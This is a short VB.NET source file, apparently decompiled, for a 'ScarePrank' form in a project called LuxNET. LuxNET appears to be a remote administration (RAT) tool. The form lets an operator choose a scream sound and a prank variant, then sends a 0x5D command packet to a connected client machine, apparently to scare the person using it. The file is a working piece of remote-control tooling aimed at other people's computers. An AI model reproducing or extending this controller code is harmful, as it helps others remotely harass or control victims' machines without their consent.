Imports LuxNET.My
Imports LuxNET.My.Resources
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class ScarePrank
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.InitializeComponent()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If (Not Me.RadioButton4.Checked Xor Me.RadioButton5.Checked) Then
                MessageBox.Show("Please select a Sound!", "Select Sound!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            Else
                Dim num As Integer = 0
                If Me.RadioButton4.Checked Then
                    num = 0
                Else
                    num = 1
                End If
                If Me.RadioButton1.Checked Then
                    Me.SendPacket(New Object() {CByte(&H5D), 0, num})
                ElseIf Me.RadioButton2.Checked Then
                    Me.SendPacket(New Object() {CByte(&H5D), 1, num})
                ElseIf Me.RadioButton3.Checked Then
                    Me.SendPacket(New Object() {CByte(&H5D), 2, num})
                End If
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub RadioButton4_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton4.CheckedChanged
        If Me.RadioButton4.Checked Then
            My.Computer.Audio.Play(My.Resources.scream1, AudioPlayMode.Background)
        End If
    End Sub

    Private Sub RadioButton5_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton5.CheckedChanged
        If Me.RadioButton5.Checked Then
            My.Computer.Audio.Play(My.Resources.scream2, AudioPlayMode.Background)
        End If
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
        GC.Collect()
    End Sub

    Public client As ServerClient
    Private packer As LuxNET.Pack

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        ScreamPrank = &H5D
    End Enum
End Class